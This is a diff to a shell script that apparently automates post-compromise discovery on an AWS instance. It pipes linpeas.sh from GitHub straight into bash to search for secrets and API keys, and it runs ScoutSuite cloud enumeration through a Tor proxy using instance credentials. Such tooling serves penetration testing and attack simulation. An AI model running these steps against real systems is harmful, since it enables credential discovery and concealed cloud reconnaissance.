@@ -55,18 +55,15 @@ aws configure set output json --profile=$PROFILE
 log "Running: aws sts get-caller-identity --profile=$PROFILE"
 aws sts get-caller-identity --profile=$PROFILE >> $LOGFILE 2>&1
 
-#######################
-# local enumeration
-#######################
-
+# local discovery
 log "Running local discovery..."
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex >> $LOGFILE 2>&1
 log "done."
 
-#######################
-# cloud enumeration
-#######################
-
+# cloud discovery
+# log "Running cloud discovery..."
+# docker run --rm --name=scoutsuite --env-file=.aws-ec2-instance rossja/ncc-scoutsuite:aws-latest scout aws
+# log "done."
 # reset docker containers
 log "Stopping and removing any existing tor containers..."
 docker stop torproxy > /dev/null 2>&1
@@ -87,7 +84,7 @@ proxy_dns
 tcp_read_time_out 15000
 tcp_connect_time_out 8000
 [ProxyList]
-socks5  $TORPROXY_IP  9050
+socks5  ${TORPROXY_IP}  9050
 EOF
 log "Building scoutesuite-tor entrypoint.sh..."
 cat > entrypoint.sh <<- EOF
@@ -99,7 +96,7 @@ while ! proxychains curl -s --connect-timeout 5 http://icanhazip.com 2> /dev/nul
     sleep 5
 done
 # Run scoutsuite with TOR proxy
-proxychains scout "\$${@}"
+proxychains scout "\${@}"
 EOF
 chmod +x entrypoint.sh
 log "Building scoutesuite-tor Dockerfile..."
@@ -112,7 +109,7 @@ ENTRYPOINT ["/entrypoint.sh"]
 EOF
 docker build -t scoutsuite-tor .
 log "Running scoutesuite-tor with aws discovery..."
-docker run --rm --name=scoutsuite-tor --link torproxy:torproxy -v "$PWD/scout-report":"/root/scout-report" --env-file=.aws-iam-user scoutsuite-tor aws --report-dir /root/scout-report --no-browser
+docker run --rm --link torproxy:torproxy --env-file=.aws-ec2-instance scoutsuite-tor aws
 
 # opts="--output json"
 
